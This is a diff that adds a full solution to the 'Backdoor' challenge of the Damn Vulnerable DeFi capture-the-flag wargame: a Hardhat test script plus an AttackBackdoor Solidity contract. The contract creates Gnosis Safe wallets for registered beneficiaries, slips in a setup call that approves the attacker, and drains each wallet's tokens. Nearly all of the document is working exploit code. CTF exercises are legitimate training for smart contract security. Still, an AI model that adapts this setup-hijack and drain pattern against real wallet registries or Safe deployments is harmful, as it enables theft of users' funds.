@@ -1,0 +1,178 @@
+const { ethers } = require('hardhat');                /////////////////Attack.sol below
+const { expect } = require('chai');
+
+describe('[Challenge] Backdoor', function () {
+    let deployer, users, attacker;
+
+    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');
+
+    before(async function () {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
+        users = [alice.address, bob.address, charlie.address, david.address]
+
+        // Deploy Gnosis Safe master copy and factory contracts
+        this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
+        this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
+        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
+        
+        // Deploy the registry
+        this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
+            this.masterCopy.address,
+            this.walletFactory.address,
+            this.token.address,
+            users
+        );
+
+        // Users are registered as beneficiaries
+        for (let i = 0; i < users.length; i++) {
+            expect(
+                await this.walletRegistry.beneficiaries(users[i])
+            ).to.be.true;            
+        }
+
+        // Transfer tokens to be distributed to the registry
+        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
+    });
+
+
+    it('Exploit', async function () {
+        /** CODE YOUR EXPLOIT HERE */
+
+        const attackerToken = this.token.connect(attacker);
+        const attackerFactory = this.walletFactory.connect(attacker);
+        const attackerMasterCopy = this.masterCopy.connect(attacker);
+        const attackerWalletRegistry = this.walletRegistry.connect(attacker);
+
+        // Helper Function
+        const checkTokenBalance = async (address, name) => {
+            const tokenBal = await attackerToken.balanceOf(address);
+            console.log(`TOKEN Balance of ${name}`, ethers.utils.formatEther(tokenBal));
+        }
+
+        await checkTokenBalance(attacker.address, "Attacker");
+
+        // Deploy attacking contract
+        const AttackModuleFactory = await ethers.getContractFactory("AttackBackdoor", attacker);
+        const attackModule = await AttackModuleFactory.deploy(
+            attacker.address,
+            attackerFactory.address,
+            attackerMasterCopy.address,
+            attackerWalletRegistry.address,
+            attackerToken.address
+        );
+        console.log("Deployed attacking module at", attackModule.address);
+
+        // ABI call to setupToken() which is malicious
+        const moduleABI = ["function setupToken(address _tokenAddress, address _attacker)"];
+        const moduleIFace = new ethers.utils.Interface(moduleABI);
+        const setupData = moduleIFace.encodeFunctionData("setupToken", [
+            attackerToken.address, 
+            attackModule.address
+        ])
+
+        // Do exploit in one transaction (after contract deployment)
+        await attackModule.exploit(users, setupData);
+          
+        await checkTokenBalance(attacker.address, "Attacker");
+
+    });
+
+    after(async function () {
+        /** SUCCESS CONDITIONS */
+        for (let i = 0; i < users.length; i++) {
+            let wallet = await this.walletRegistry.wallets(users[i]);
+            
+            // User must have registered a wallet
+            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");
+
+            // User is no longer registered as a beneficiary
+            expect(
+                await this.walletRegistry.beneficiaries(users[i])
+            ).to.be.false;
+        }
+
+        // Attacker must have taken all tokens
+        expect(
+            await this.token.balanceOf(attacker.address)
+        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
+    });
+});
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+pragma solidity ^0.8.7;
+
+import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
+
+
+import "../DamnValuableToken.sol";
+
+contract AttackBackdoor {
+    address public owner;
+    address public factory;
+    address public masterCopy;
+    address public walletRegistry;
+    address public token;
+
+    constructor(
+        address _owner,
+        address _factory,
+        address _masterCopy,
+        address _walletRegistry,
+        address _token
+    ) {
+        owner = _owner;
+        factory = _factory;
+        masterCopy = _masterCopy;
+        walletRegistry = _walletRegistry;
+        token = _token;
+    }
+
+    function setupToken(address _tokenAddress, address _attacker) external {
+        DamnValuableToken(_tokenAddress).approve(_attacker, 10 ether);
+    }
+
+    
+    function exploit(address[] memory users, bytes memory setupData) external {
+        for (uint256 i = 0; i < users.length; i++) {
+            // Need to create a dynamically sized array for the user to meet signature req's
+            address user = users[i];
+            address[] memory victim = new address[](1);
+            victim[0] = user;
+
+            // Create ABI call for proxy
+            string
+                memory signatureString = "setup(address[],uint256,address,bytes,address,address,uint256,address)";
+            bytes memory initGnosis = abi.encodeWithSignature(
+                signatureString,
+                victim,
+                uint256(1),
+                address(this),
+                setupData,
+                address(0),
+                address(0),
+                uint256(0),
+                address(0)
+            );
+
+            GnosisSafeProxy newProxy = GnosisSafeProxyFactory(factory)
+                .createProxyWithCallback(
+                    masterCopy,
+                    initGnosis,
+                    123,
+                    IProxyCreationCallback(walletRegistry)
+                );
+
+            DamnValuableToken(token).transferFrom(
+                address(newProxy),
+                owner,
+                10 ether
+            );
+        }
+    }
+}
